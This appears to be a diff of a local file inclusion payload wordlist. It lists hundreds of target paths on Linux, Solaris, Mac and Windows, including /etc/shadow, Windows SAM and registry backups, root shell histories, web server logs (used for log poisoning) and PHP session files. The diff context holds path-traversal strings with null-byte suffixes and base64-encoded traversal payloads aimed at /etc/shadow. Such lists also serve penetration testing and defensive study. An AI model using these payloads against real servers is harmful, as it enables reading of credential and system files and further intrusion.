@@ -1,3 +1,700 @@
+#==============================================================================
+
+***Syetem Log files*** 
+
+#==============================================================================
+
+
+"proc/self/environ",
+"apache2/logs/access.log",
+"apache2/logs/error_log",
+"apache2/logs/error.log",
+"apache/logs/access_log",
+"apache/logs/access.log",
+"apache2/logs/access_log",
+"var/log/apache2/access.log",
+"var/log/apache2/access_log",
+"etc/httpd/logs/access_log",
+"etc/httpd/logs/access.log",
+"etc/httpd/logs/error_log",
+"etc/httpd/logs/error.log",
+"var/log/apache/error_log",
+"var/log/apache2/error_log",
+"var/log/apache/error.log",
+"var/log/apache2/error.log",
+"var/log/error_log",
+"var/log/error.log",
+"var/www/logs/error_log",
+"var/www/logs/error.log",
+"var/log/auth.log",
+"etc/apache2/sites-available/default",
+"etc/apache2/vhosts.d/default_vhost.include",
+"etc/httpd/logs/acces_log",
+"etc/httpd/logs/acces.log",
+"logs/access_log",
+"logs/access.log",
+"opt/lampp/logs/access_log",
+"opt/lampp/logs/access.log",
+"opt/lampp/logs/error_log",
+"opt/lampp/logs/error.log",
+"opt/xampp/logs/access_log",
+"opt/xampp/logs/access.log",
+"opt/xampp/logs/error_log",
+"opt/xampp/logs/error.log",
+"etc/logrotate.d/ftp",
+"etc/logrotate.d/httpd",
+"etc/logrotate.d/proftpd",
+"etc/logrotate.d/vsftpd.log",
+"usr/local/apache2/logs/access_log",
+"usr/local/apache2/logs/access.log",
+"usr/local/apache2/logs/error_log",
+"usr/local/apache/logs/access_log",
+"usr/local/apache/logs/access_ log",
+"usr/local/apache/logs/access.log",
+"usr/local/apache/logs/access. log",
+"usr/local/apache/logs/error_log",
+"usr/local/apache/logs/error.log",
+"usr/local/cpanel/logs",
+"usr/local/cpanel/logs/access_log",
+"usr/local/cpanel/logs/error_log",
+"usr/local/cpanel/logs/license_log",
+"usr/local/cpanel/logs/login_log",
+"usr/local/cpanel/logs/stats_log",
+"usr/local/www/logs/thttpd_log",
+"var/log/access_log",
+"var/log/access.log",
+"var/log/apache/access_log",
+"var/log/apache/access.log",
+"var/log/apache-ssl/access.log",
+"var/log/apache-ssl/error.log",
+"var/log/auth",
+"var/log/authlog",
+"var/log/ftplog",
+"var/log/ftp-proxy",
+"var/log/ftp-proxy/ftp-proxy.log",
+"var/log/httpd/access_log",
+"var/log/httpd/access.log",
+"var/log/httpd/error_log",
+"var/log/httpd/error.log",
+"var/log/httpsd/ssl.access_log",
+"var/log/httpsd/ssl_log",
+"var/log/lighttpd",
+"var/log/mysqlderror.log",
+"var/log/mysqld.log",
+"var/log/mysql.log",
+"var/log/mysql/mysql-bin.log",
+"var/log/mysql/mysql.log",
+"var/log/mysql/mysql-slow.log",
+"var/log/proftpd.access_log",
+"var/log/pureftpd.log",
+"var/log/pure-ftpd/pure-ftpd.log",
+"var/log/thttpd_log",
+"var/log/vsftpd.log",
+"var/www/log/access_log",
+"var/www/log/error_log",
+"var/www/logs/access_log",
+"var/www/logs/access.log",
+"var/log/httpd-access.log",
+"var/log/httpd-error.log",
+"www/logs/proftpd.system.log",]
+
+=============================================================================
+
+=============================================================================
+
+
+/etc/httpd/logs/acces_log 
+/etc/httpd/logs/error_log 
+/var/www/logs/access_log 
+/var/www/logs/access.log 
+/usr/local/apache/logs/access_ log 
+/usr/local/apache/logs/access. log 
+/var/log/apache/access_log 
+/var/log/apache2/access_log 
+/var/log/apache/access.log 
+/var/log/apache2/access.log
+/var/log/access_log
+
+
+=============================================================================
+Proc files
+=============================================================================
+/proc/sched_debug # Can be used to see what processes the machine is running
+/proc/mounts
+/proc/net/arp
+/proc/net/route
+/proc/net/tcp
+/proc/net/udp
+/proc/net/fib_trie
+/proc/version
+/proc/self/environ
+
+=============================================================================
+Win apache log
+=============================================================================
+c:\Program Files\Apache Group\Apache\logs\access.log  
+c:\Program Files\Apache Group\Apache\logs\error.log
+C:\apache\logs\access.log
+C:\apache\logs\error.log
+C:\Program Files\Apache Group\Apache\logs\access.log
+C:\Program Files\Apache Group\Apache\logs\error.log
+C:\program files\wamp\apache2\logs
+C:\wamp\apache2\logs
+C:\wamp\logs
+C:\xampp\apache\logs\access.log
+C:\xampp\apache\logs\error.log
+C:/Users/Administrator/NTUser.dat
+C:/Documents and Settings/Administrator/NTUser.dat
+C:/apache/logs/access.log
+C:/apache/logs/error.log
+C:/apache/php/php.ini
+C:/boot.ini
+C:/inetpub/wwwroot/global.asa
+C:/MySQL/data/hostname.err
+C:/MySQL/data/mysql.err
+C:/MySQL/data/mysql.log
+C:/MySQL/my.cnf
+C:/MySQL/my.ini
+C:/php4/php.ini
+C:/php5/php.ini
+C:/php/php.ini
+C:/Program Files/Apache Group/Apache2/conf/httpd.conf
+C:/Program Files/Apache Group/Apache/conf/httpd.conf
+C:/Program Files/Apache Group/Apache/logs/access.log
+C:/Program Files/Apache Group/Apache/logs/error.log
+C:/Program Files/FileZilla Server/FileZilla Server.xml
+C:/Program Files/MySQL/data/hostname.err
+C:/Program Files/MySQL/data/mysql-bin.log
+C:/Program Files/MySQL/data/mysql.err
+C:/Program Files/MySQL/data/mysql.log
+C:/Program Files/MySQL/my.ini
+C:/Program Files/MySQL/my.cnf
+C:/Program Files/MySQL/MySQL Server 5.0/data/hostname.err
+C:/Program Files/MySQL/MySQL Server 5.0/data/mysql-bin.log 
+C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.err 
+C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.log 
+C:/Program Files/MySQL/MySQL Server 5.0/my.cnf
+C:/Program Files/MySQL/MySQL Server 5.0/my.ini
+C:/Program Files (x86)/Apache Group/Apache2/conf/httpd.conf 
+C:/Program Files (x86)/Apache Group/Apache/conf/httpd.conf 
+C:/Program Files (x86)/Apache Group/Apache/conf/access.log 
+C:/Program Files (x86)/Apache Group/Apache/conf/error.log 
+C:/Program Files (x86)/FileZilla Server/FileZilla Server.xml 
+C:/Program Files (x86)/xampp/apache/conf/httpd.conf 
+C:/WINDOWS/php.ini
+C:/WINDOWS/Repair/SAM 
+C:/Windows/repair/system C:/Windows/repair/software 
+C:/Windows/repair/security 
+C:/WINDOWS/System32/drivers/etc/hosts
+C:/Windows/win.ini 
+C:/WINNT/php.ini
+C:/WINNT/win.ini
+C:/xampp/apache/bin/php.ini
+C:/xampp/apache/logs/access.log 
+C:/xampp/apache/logs/error.log 
+C:/Windows/Panther/Unattend/Unattended.xml 
+C:/Windows/Panther/Unattended.xml 
+C:/Windows/debug/NetSetup.log 
+C:/Windows/system32/config/AppEvent.Evt 
+C:/Windows/system32/config/SecEvent.Evt 
+C:/Windows/system32/config/default.sav 
+C:/Windows/system32/config/security.sav 
+C:/Windows/system32/config/software.sav 
+C:/Windows/system32/config/system.sav 
+C:/Windows/system32/config/regback/default 
+C:/Windows/system32/config/regback/sam 
+C:/Windows/system32/config/regback/security 
+C:/Windows/system32/config/regback/system 
+C:/Windows/system32/config/regback/software
+C:/Program Files/MySQL/MySQL Server 5.1/my.ini 
+C:/Windows/System32/inetsrv/config/schema/ASPNET_schema.xml 
+C:/Windows/System32/inetsrv/config/applicationHost.config 
+C:/inetpub/logs/LogFiles/W3SVC1/u_ex[YYMMDD].log
+
+==============================================================================
+Common Web Logs
+==============================================================================
+
+
+/etc/httpd/logs/access.log
+/etc/httpd/logs/access_log
+/etc/httpd/logs/error.log
+/etc/httpd/logs/error_log
+/opt/lampp/logs/access_log
+/opt/lampp/logs/error_log
+/usr/local/apache/log
+/usr/local/apache/logs
+/usr/local/apache/logs/access.log
+/usr/local/apache/logs/access_log
+/usr/local/apache/logs/error.log
+/usr/local/apache/logs/error_log
+/usr/local/etc/httpd/logs/access_log
+/usr/local/etc/httpd/logs/error_log
+/usr/local/www/logs/thttpd_log
+/var/apache/logs/access_log
+/var/apache/logs/error_log
+/var/log/apache/access.log
+/var/log/apache/error.log
+/var/log/apache-ssl/access.log
+/var/log/apache-ssl/error.log
+/var/log/httpd/access_log
+/var/log/httpd/error_log
+/var/log/httpsd/ssl.access_log
+/var/log/httpsd/ssl_log
+/var/log/thttpd_log
+/var/www/log/access_log
+/var/www/log/error_log
+/var/www/logs/access.log
+/var/www/logs/access_log
+/var/www/logs/error.log
+/var/www/logs/error_log
+
+
+
+
+/var/log/syslog or /var/log/messages
+/var/log/kern.log or /var/log/dmesg
+/var/log/auth.log or /var/log/secure
+/var/log/cron.log
+/var/log/mail.log or /var/log/maillog
+
+
+===============================================================================
+Common services to find log files
+
+===============================================================================
+
+
+*.err;kern.debug;auth.notice /dev/console
+daemon,auth.notice           /var/log/messages
+lpr.info                     /var/log/lpr.log
+mail.*                       /var/log/mail.log
+ftp.*                        /var/log/ftp.log
+auth.*                       @prep.ai.mit.edu
+auth.*                       root,amrood
+netinfo.err                  /var/log/netinfo.log
+install.*                    /var/log/install.log
+*.emerg                      *
+*.alert                      |program_name
+mark.*                       /dev/console
+
+
+Application 					Directory
+httpd 						 /var/log/httpd
+samba 						 /var/log/samba
+cron 						 /var/log/
+mail 						 /var/log/
+mysql 					     /var/log/
+
+							 /var/log/apache2
+							 /var/log/apt
+							 /var/log/exim4
+							 /var/log/gdm3
+							 /var/log/inetsim
+							 /var/log/installer
+							 /var/log/journal
+							 /var/log/lightdm
+							 /var/log/mysql
+							 /var/log/nordvpn
+							 /var/log/ntpstats
+							 /var/log/openvpn
+							 /var/log/postgresql
+							 /var/log/private
+							 /var/log/runit
+							 /var/log/samba
+							 /var/log/speech-dispatcher
+							 /var/log/squid
+							 /var/log/stunnel4
+							 /var/log/sysstat
+							 /var/log/teamviewer15
+							 /var/log/tor
+							 /var/log/unattended-upgrades
+							 /var/log/vmware
+							 /var/log/zypp
+
+
+=============================================================================
+
+=============================================================================
+
+
+ "/var/log/messages",
+ "/var/log/auth.log",
+ "/var/log/secure",
+ "/var/log/dmesg",
+ "/var/log/alternatives.log",
+ "/var/log/anaconda.log",
+ "/var/log/audit",
+ "/var/log/boot.log",
+ "/var/log/cron",
+ "/var/log/cups",
+ "/var/log/faillog",
+ "/var/log/kern.log",
+ "/var/log/maillog",
+ "/var/log/mail.log",
+ "/var/log/pm-powersave.log",
+ "/var/log/spooler",
+ "/var/log/lastlog",
+ "/var/log/tallylog",
+ "/var/log/btmp",
+ "/var/log/utmp",
+ "/var/log/wtmp",
+ "/var/log/messages",
+ "/var/log/warn",
+ "/var/log/poplog",
+ "/var/log/qmail",
+ "/var/log/smtpd",
+ "/var/log/telnetd",
+ "/var/log/cups/access_log",
+ "/var/log/cups/error_log",
+ "/var/log/thttpd_log",
+ "/var/log/spooler",
+ "/var/spool/tmp",
+ "/var/spool/errors",
+ "/var/spool/locks",
+ "/var/log/nctfpd.errs",
+ "/var/log/acct",
+ "/var/apache/log",
+ "/var/apache/logs",
+ "/usr/local/apache/log",
+ "/usr/local/apache/logs",
+ "/usr/local/www/logs/thttpd_log",
+ "/var/log/news",
+ "/var/log/news/news",
+ "/var/log/news.all",
+ "/var/log/news/news.all",
+ "/var/log/news/news.crit",
+ "/var/log/news/news.err",
+ "/var/log/news/news.notice",
+ "/var/log/news/suck.err",
+ "/var/log/news/suck.notice",
+ "/var/log/xferlog",
+ "/var/log/proftpd/xferlog.legacy",
+ "/var/log/proftpd.xferlog",
+ "/var/log/proftpd.access_log",
+ "/var/log/httpd/error_log",
+ "/var/log/httpsd/ssl_log",
+ "/var/log/httpsd/ssl.access_log",
+ "/var/adm",
+ "/var/run/utmp",
+ "/etc/wtmp",
+ "/etc/utmp",
+ "/etc/mail/access",
+ "/var/log/mail/info.log",
+ "/var/log/mail/errors.log",
+ "/var/log/httpd/*_log",
+ "/var/log/ncftpd/misclog.txt",
+ "/var/account/pacct",
+ "/var/log/snort",
+ "/var/log/bandwidth",
+ "/var/log/explanations",
+ "/var/log/syslog",
+ "/var/log/user.log",
+ "/var/log/daemons/info.log",
+ "/var/log/daemons/warnings.log",
+ "/var/log/daemons/errors.log",
+ "/etc/httpd/logs/error_log",
+ "/etc/httpd/logs/*_log",
+ "/var/log/mysqld/mysqld.log"
+ "/root/.ksh_history",
+ "/root/.bash_history",
+ "/root/.sh_history",
+ "/root/.history",
+ "/root/*_history",
+ "/root/.login",
+ "/root/.logout",
+ "/root/.bash_logut",
+ "/root/.Xauthority"
+ "/etc/sv/ssh/log",
+ "/etc/sv/tor/log",
+
+
+================================================================================
+
+ Windows Fingerprinting
+================================================================================
+
+c:\WINDOWS\system32\eula.txt
+c:\boot.ini  
+c:\WINDOWS\win.ini  
+c:\WINNT\win.ini  
+c:\WINDOWS\Repair\SAM  
+c:\WINDOWS\php.ini  
+c:\WINNT\php.ini  
+c:\Program Files\Apache Group\Apache\conf\httpd.conf  
+c:\Program Files\Apache Group\Apache2\conf\httpd.conf  
+c:\Program Files\xampp\apache\conf\httpd.conf  
+c:\php\php.ini  
+c:\php5\php.ini  
+c:\php4\php.ini  
+c:\apache\php\php.ini  
+c:\xampp\apache\bin\php.ini  
+c:\home2\bin\stable\apache\php.ini  
+c:\home\bin\stable\apache\php.ini
+
+
+
+
+==============================================================================
+Win
+PHP Session Locations 
+==============================================================================
+
+c:\WINDOWS\TEMP\  
+c:\php\sessions\  
+c:\php5\sessions\  
+c:\php4\sessions\
+
+
+
+
+==================================================================================
+Useful files for LFI
+
+Linux + Solaris files (Darwin [Mac] systems may have a prefix of /private/)
+==================================================================================
+
+- Fingerprinting (General files)
+
+    /etc/passwd
+    /etc/master.passwd
+    /etc/shadow
+    /var/db/shadow/hash
+    /etc/group
+    /etc/hosts
+    /etc/motd
+    /etc/issue
+    /etc/release
+    /etc/redhat-release
+    /etc/crontab
+    /etc/inittab
+    /proc/version
+    /proc/cmdline
+    /proc/self/environ
+    /proc/self/fd/0
+    /proc/self/fd/1
+    /proc/self/fd/2
+    /proc/self/fd/255
+    /etc/httpd.conf
+    /etc/apache2.conf
+    /etc/apache2/apache2.conf
+    /etc/apache2/httpd.conf
+    /etc/httpd/conf/httpd.conf
+    /etc/httpd/httpd.conf
+    /etc/apache2/conf/httpd.conf
+    /etc/apache/conf/httpd.conf
+    /usr/local/apache2/conf/httpd.conf
+    /usr/local/apache/conf/httpd.conf
+    /etc/apache2/sites-enabled/000-default
+    /etc/apache2/sites-available/default
+    /etc/nginx.conf
+    /etc/nginx/nginx.conf
+    /etc/nginx/sites-available/default
+    /etc/nginx/sites-enabled/default
+    /etc/ssh/sshd_config
+    /etc/my.cnf
+    /etc/mysql/my.cnf
+    /etc/php.ini
+    /var/mail/www-data
+    /var/mail/www
+    /var/mail/apache
+    /var/mail/nobody
+    /var/www/.bash_history
+    /root/.bash_history
+    /var/root/.bash_history
+    /var/root/.sh_history
+
+- Less common paths for httpd.conf/php.ini
+
+    /usr/local/apache/httpd.conf
+    /usr/local/apache2/httpd.conf
+    /usr/local/httpd/conf/httpd.conf
+    /usr/local/etc/apache/conf/httpd.conf
+    /usr/local/etc/apache2/conf/httpd.conf
+    /usr/local/etc/httpd/conf/httpd.conf
+    /usr/apache2/conf/httpd.conf
+    /usr/apache/conf/httpd.conf
+    /etc/http/conf/httpd.conf
+    /etc/http/httpd.conf
+    /opt/apache/conf/httpd.conf
+    /opt/apache2/conf/httpd.conf
+    /var/www/conf/httpd.conf
+    /usr/local/php/httpd.conf
+    /usr/local/php4/httpd.conf
+    /usr/local/php5/httpd.conf
+    /etc/httpd/php.ini
+    /usr/lib/php.ini
+    /usr/lib/php/php.ini
+    /usr/local/etc/php.ini
+    /usr/local/lib/php.ini
+    /usr/local/php/lib/php.ini
+    /usr/local/php4/lib/php.ini
+    /usr/local/php5/lib/php.ini
+    /usr/local/apache/conf/php.ini
+    /etc/php4/apache/php.ini
+    /etc/php4/apache2/php.ini
+    /etc/php5/apache/php.ini
+    /etc/php5/apache2/php.ini
+    /etc/php/php.ini
+    /etc/php/php4/php.ini
+    /etc/php/apache/php.ini
+    /etc/php/apache2/php.ini
+    /usr/local/Zend/etc/php.ini
+    /opt/xampp/etc/php.ini
+    /var/local/www/conf/php.ini
+    /etc/php/cgi/php.ini
+    /etc/php4/cgi/php.ini
+    /etc/php5/cgi/php.ini
+
+- OS Logs
+
+ Linux
+
+    /var/log/lastlog
+    /var/log/wtmp
+    /var/run/utmp
+    /var/log/messages.log
+    /var/log/messages
+    /var/log/messages.0
+    /var/log/messages.0.gz
+    /var/log/messages.1
+    /var/log/messages.1.gz
+    /var/log/messages.2
+    /var/log/messages.2.gz
+    /var/log/messages.3
+    /var/log/messages.3.gz
+    /var/log/syslog.log
+    /var/log/syslog
+    /var/log/syslog.0
+    /var/log/syslog.0.gz
+    /var/log/syslog.1
+    /var/log/syslog.1.gz
+    /var/log/syslog.2
+    /var/log/syslog.2.gz
+    /var/log/syslog.3
+    /var/log/syslog.3.gz
+    /var/log/auth.log
+    /var/log/auth.log.0
+    /var/log/auth.log.0.gz
+    /var/log/auth.log.1
+    /var/log/auth.log.1.gz
+    /var/log/auth.log.2
+    /var/log/auth.log.2.gz
+    /var/log/auth.log.3
+    /var/log/auth.log.3.gz
+
+ Solaris
+
+    /var/log/authlog
+    /var/log/syslog
+    /var/adm/lastlog
+    /var/adm/messages
+    /var/adm/messages.0
+    /var/adm/messages.1
+    /var/adm/messages.2
+    /var/adm/messages.3
+    /var/adm/utmpx
+    /var/adm/wtmpx
+
+ Mac
+
+    /var/log/kernel.log
+    /var/log/secure.log
+    /var/log/mail.log
+    /var/run/utmp
+    /var/log/wtmp
+    /var/log/lastlog
+
+- HTTPD Logs
+
+    /var/log/access.log
+    /var/log/access_log
+    /var/log/error.log
+    /var/log/error_log
+    /var/log/apache2/access.log
+    /var/log/apache2/access_log
+    /var/log/apache2/error.log
+    /var/log/apache2/error_log
+    /var/log/apache/access.log
+    /var/log/apache/access_log
+    /var/log/apache/error.log
+    /var/log/apache/error_log
+    /var/log/httpd/access.log
+    /var/log/httpd/access_log
+    /var/log/httpd/error.log
+    /var/log/httpd/error_log
+    /etc/httpd/logs/access.log
+    /etc/httpd/logs/access_log
+    /etc/httpd/logs/error.log
+    /etc/httpd/logs/error_log
+    /usr/local/apache/logs/access.log
+    /usr/local/apache/logs/access_log
+    /usr/local/apache/logs/error.log
+    /usr/local/apache/logs/error_log
+    /usr/local/apache2/logs/access.log
+    /usr/local/apache2/logs/access_log
+    /usr/local/apache2/logs/error.log
+    /usr/local/apache2/logs/error_log
+    /var/www/logs/access.log
+    /var/www/logs/access_log
+    /var/www/logs/error.log
+    /var/www/logs/error_log
+    /opt/lampp/logs/access.log
+    /opt/lampp/logs/access_log
+    /opt/lampp/logs/error.log
+    /opt/lampp/logs/error_log
+    /opt/xampp/logs/access.log
+    /opt/xampp/logs/access_log
+    /opt/xampp/logs/error.log
+    /opt/xampp/logs/error_log
+
+- PHP Session Locations
+
+    /tmp/sess_<sessid>
+    /var/lib/php/session/sess_<sessid>
+    /var/lib/php5/session/sess_<sessid>
+
+Windows files
+
+- Fingerprinting
+
+    *:\boot.ini
+    *:\WINDOWS\win.ini
+    *:\WINNT\win.ini
+    *:\WINDOWS\Repair\SAM
+    *:\WINDOWS\php.ini
+    *:\WINNT\php.ini
+    *:\Program Files\Apache Group\Apache\conf\httpd.conf
+    *:\Program Files\Apache Group\Apache2\conf\httpd.conf
+    *:\Program Files\xampp\apache\conf\httpd.conf
+    *:\php\php.ini
+    *:\php5\php.ini
+    *:\php4\php.ini
+    *:\apache\php\php.ini
+    *:\xampp\apache\bin\php.ini
+    *:\home2\bin\stable\apache\php.ini
+    *:\home\bin\stable\apache\php.ini
+
+- Logs
+
+    *:\Program Files\Apache Group\Apache\logs\access.log
+    *:\Program Files\Apache Group\Apache\logs\error.log
+
+- PHP Session Locations
+
+    *:\WINDOWS\TEMP\
+    *:\php\sessions\
+    *:\php5\sessions\
+    *:\php4\sessions\
+
+
+
+
+
+===============================================================================================================================================================
+===============================================================================================================================================================
+
+
 /.../.../.../.../.../
 \…..\\\…..\\\…..\\\
 %00../../../../../../etc/passwd
@@ -914,691 +1611,3 @@ Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4v
 Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3NoYWRvdyUwMA==
 
 
-#==============================================================================
-
-***Syetem Log files*** 
-
-#==============================================================================
-
-
-"proc/self/environ",
-"apache2/logs/access.log",
-"apache2/logs/error_log",
-"apache2/logs/error.log",
-"apache/logs/access_log",
-"apache/logs/access.log",
-"apache2/logs/access_log",
-"var/log/apache2/access.log",
-"var/log/apache2/access_log",
-"etc/httpd/logs/access_log",
-"etc/httpd/logs/access.log",
-"etc/httpd/logs/error_log",
-"etc/httpd/logs/error.log",
-"var/log/apache/error_log",
-"var/log/apache2/error_log",
-"var/log/apache/error.log",
-"var/log/apache2/error.log",
-"var/log/error_log",
-"var/log/error.log",
-"var/www/logs/error_log",
-"var/www/logs/error.log",
-"var/log/auth.log",
-"etc/apache2/sites-available/default",
-"etc/apache2/vhosts.d/default_vhost.include",
-"etc/httpd/logs/acces_log",
-"etc/httpd/logs/acces.log",
-"logs/access_log",
-"logs/access.log",
-"opt/lampp/logs/access_log",
-"opt/lampp/logs/access.log",
-"opt/lampp/logs/error_log",
-"opt/lampp/logs/error.log",
-"opt/xampp/logs/access_log",
-"opt/xampp/logs/access.log",
-"opt/xampp/logs/error_log",
-"opt/xampp/logs/error.log",
-"etc/logrotate.d/ftp",
-"etc/logrotate.d/httpd",
-"etc/logrotate.d/proftpd",
-"etc/logrotate.d/vsftpd.log",
-"usr/local/apache2/logs/access_log",
-"usr/local/apache2/logs/access.log",
-"usr/local/apache2/logs/error_log",
-"usr/local/apache/logs/access_log",
-"usr/local/apache/logs/access_ log",
-"usr/local/apache/logs/access.log",
-"usr/local/apache/logs/access. log",
-"usr/local/apache/logs/error_log",
-"usr/local/apache/logs/error.log",
-"usr/local/cpanel/logs",
-"usr/local/cpanel/logs/access_log",
-"usr/local/cpanel/logs/error_log",
-"usr/local/cpanel/logs/license_log",
-"usr/local/cpanel/logs/login_log",
-"usr/local/cpanel/logs/stats_log",
-"usr/local/www/logs/thttpd_log",
-"var/log/access_log",
-"var/log/access.log",
-"var/log/apache/access_log",
-"var/log/apache/access.log",
-"var/log/apache-ssl/access.log",
-"var/log/apache-ssl/error.log",
-"var/log/auth",
-"var/log/authlog",
-"var/log/ftplog",
-"var/log/ftp-proxy",
-"var/log/ftp-proxy/ftp-proxy.log",
-"var/log/httpd/access_log",
-"var/log/httpd/access.log",
-"var/log/httpd/error_log",
-"var/log/httpd/error.log",
-"var/log/httpsd/ssl.access_log",
-"var/log/httpsd/ssl_log",
-"var/log/lighttpd",
-"var/log/mysqlderror.log",
-"var/log/mysqld.log",
-"var/log/mysql.log",
-"var/log/mysql/mysql-bin.log",
-"var/log/mysql/mysql.log",
-"var/log/mysql/mysql-slow.log",
-"var/log/proftpd.access_log",
-"var/log/pureftpd.log",
-"var/log/pure-ftpd/pure-ftpd.log",
-"var/log/thttpd_log",
-"var/log/vsftpd.log",
-"var/www/log/access_log",
-"var/www/log/error_log",
-"var/www/logs/access_log",
-"var/www/logs/access.log",
-"var/log/httpd-access.log",
-"var/log/httpd-error.log",
-"www/logs/proftpd.system.log",]
-
-=============================================================================
-
-=============================================================================
-
-
-/etc/httpd/logs/acces_log 
-/etc/httpd/logs/error_log 
-/var/www/logs/access_log 
-/var/www/logs/access.log 
-/usr/local/apache/logs/access_ log 
-/usr/local/apache/logs/access. log 
-/var/log/apache/access_log 
-/var/log/apache2/access_log 
-/var/log/apache/access.log 
-/var/log/apache2/access.log
-/var/log/access_log
-
-
-=============================================================================
-Proc files
-=============================================================================
-/proc/sched_debug # Can be used to see what processes the machine is running
-/proc/mounts
-/proc/net/arp
-/proc/net/route
-/proc/net/tcp
-/proc/net/udp
-/proc/net/fib_trie
-/proc/version
-/proc/self/environ
-
-=============================================================================
-Win apache log
-=============================================================================
-c:\Program Files\Apache Group\Apache\logs\access.log  
-c:\Program Files\Apache Group\Apache\logs\error.log
-C:\apache\logs\access.log
-C:\apache\logs\error.log
-C:\Program Files\Apache Group\Apache\logs\access.log
-C:\Program Files\Apache Group\Apache\logs\error.log
-C:\program files\wamp\apache2\logs
-C:\wamp\apache2\logs
-C:\wamp\logs
-C:\xampp\apache\logs\access.log
-C:\xampp\apache\logs\error.log
-C:/Users/Administrator/NTUser.dat
-C:/Documents and Settings/Administrator/NTUser.dat
-C:/apache/logs/access.log
-C:/apache/logs/error.log
-C:/apache/php/php.ini
-C:/boot.ini
-C:/inetpub/wwwroot/global.asa
-C:/MySQL/data/hostname.err
-C:/MySQL/data/mysql.err
-C:/MySQL/data/mysql.log
-C:/MySQL/my.cnf
-C:/MySQL/my.ini
-C:/php4/php.ini
-C:/php5/php.ini
-C:/php/php.ini
-C:/Program Files/Apache Group/Apache2/conf/httpd.conf
-C:/Program Files/Apache Group/Apache/conf/httpd.conf
-C:/Program Files/Apache Group/Apache/logs/access.log
-C:/Program Files/Apache Group/Apache/logs/error.log
-C:/Program Files/FileZilla Server/FileZilla Server.xml
-C:/Program Files/MySQL/data/hostname.err
-C:/Program Files/MySQL/data/mysql-bin.log
-C:/Program Files/MySQL/data/mysql.err
-C:/Program Files/MySQL/data/mysql.log
-C:/Program Files/MySQL/my.ini
-C:/Program Files/MySQL/my.cnf
-C:/Program Files/MySQL/MySQL Server 5.0/data/hostname.err
-C:/Program Files/MySQL/MySQL Server 5.0/data/mysql-bin.log 
-C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.err 
-C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.log 
-C:/Program Files/MySQL/MySQL Server 5.0/my.cnf
-C:/Program Files/MySQL/MySQL Server 5.0/my.ini
-C:/Program Files (x86)/Apache Group/Apache2/conf/httpd.conf 
-C:/Program Files (x86)/Apache Group/Apache/conf/httpd.conf 
-C:/Program Files (x86)/Apache Group/Apache/conf/access.log 
-C:/Program Files (x86)/Apache Group/Apache/conf/error.log 
-C:/Program Files (x86)/FileZilla Server/FileZilla Server.xml 
-C:/Program Files (x86)/xampp/apache/conf/httpd.conf 
-C:/WINDOWS/php.ini
-C:/WINDOWS/Repair/SAM 
-C:/Windows/repair/system C:/Windows/repair/software 
-C:/Windows/repair/security 
-C:/WINDOWS/System32/drivers/etc/hosts
-C:/Windows/win.ini 
-C:/WINNT/php.ini
-C:/WINNT/win.ini
-C:/xampp/apache/bin/php.ini
-C:/xampp/apache/logs/access.log 
-C:/xampp/apache/logs/error.log 
-C:/Windows/Panther/Unattend/Unattended.xml 
-C:/Windows/Panther/Unattended.xml 
-C:/Windows/debug/NetSetup.log 
-C:/Windows/system32/config/AppEvent.Evt 
-C:/Windows/system32/config/SecEvent.Evt 
-C:/Windows/system32/config/default.sav 
-C:/Windows/system32/config/security.sav 
-C:/Windows/system32/config/software.sav 
-C:/Windows/system32/config/system.sav 
-C:/Windows/system32/config/regback/default 
-C:/Windows/system32/config/regback/sam 
-C:/Windows/system32/config/regback/security 
-C:/Windows/system32/config/regback/system 
-C:/Windows/system32/config/regback/software
-C:/Program Files/MySQL/MySQL Server 5.1/my.ini 
-C:/Windows/System32/inetsrv/config/schema/ASPNET_schema.xml 
-C:/Windows/System32/inetsrv/config/applicationHost.config 
-C:/inetpub/logs/LogFiles/W3SVC1/u_ex[YYMMDD].log
-
-==============================================================================
-Common Web Logs
-==============================================================================
-
-
-/etc/httpd/logs/access.log
-/etc/httpd/logs/access_log
-/etc/httpd/logs/error.log
-/etc/httpd/logs/error_log
-/opt/lampp/logs/access_log
-/opt/lampp/logs/error_log
-/usr/local/apache/log
-/usr/local/apache/logs
-/usr/local/apache/logs/access.log
-/usr/local/apache/logs/access_log
-/usr/local/apache/logs/error.log
-/usr/local/apache/logs/error_log
-/usr/local/etc/httpd/logs/access_log
-/usr/local/etc/httpd/logs/error_log
-/usr/local/www/logs/thttpd_log
-/var/apache/logs/access_log
-/var/apache/logs/error_log
-/var/log/apache/access.log
-/var/log/apache/error.log
-/var/log/apache-ssl/access.log
-/var/log/apache-ssl/error.log
-/var/log/httpd/access_log
-/var/log/httpd/error_log
-/var/log/httpsd/ssl.access_log
-/var/log/httpsd/ssl_log
-/var/log/thttpd_log
-/var/www/log/access_log
-/var/www/log/error_log
-/var/www/logs/access.log
-/var/www/logs/access_log
-/var/www/logs/error.log
-/var/www/logs/error_log
-
-
-
-
-/var/log/syslog or /var/log/messages
-/var/log/kern.log or /var/log/dmesg
-/var/log/auth.log or /var/log/secure
-/var/log/cron.log
-/var/log/mail.log or /var/log/maillog
-
-
-===============================================================================
-Common services to find log files
-
-===============================================================================
-
-
-*.err;kern.debug;auth.notice /dev/console
-daemon,auth.notice           /var/log/messages
-lpr.info                     /var/log/lpr.log
-mail.*                       /var/log/mail.log
-ftp.*                        /var/log/ftp.log
-auth.*                       @prep.ai.mit.edu
-auth.*                       root,amrood
-netinfo.err                  /var/log/netinfo.log
-install.*                    /var/log/install.log
-*.emerg                      *
-*.alert                      |program_name
-mark.*                       /dev/console
-
-
-Application 					Directory
-httpd 						 /var/log/httpd
-samba 						 /var/log/samba
-cron 						 /var/log/
-mail 						 /var/log/
-mysql 					     /var/log/
-
-							 /var/log/apache2
-							 /var/log/apt
-							 /var/log/exim4
-							 /var/log/gdm3
-							 /var/log/inetsim
-							 /var/log/installer
-							 /var/log/journal
-							 /var/log/lightdm
-							 /var/log/mysql
-							 /var/log/nordvpn
-							 /var/log/ntpstats
-							 /var/log/openvpn
-							 /var/log/postgresql
-							 /var/log/private
-							 /var/log/runit
-							 /var/log/samba
-							 /var/log/speech-dispatcher
-							 /var/log/squid
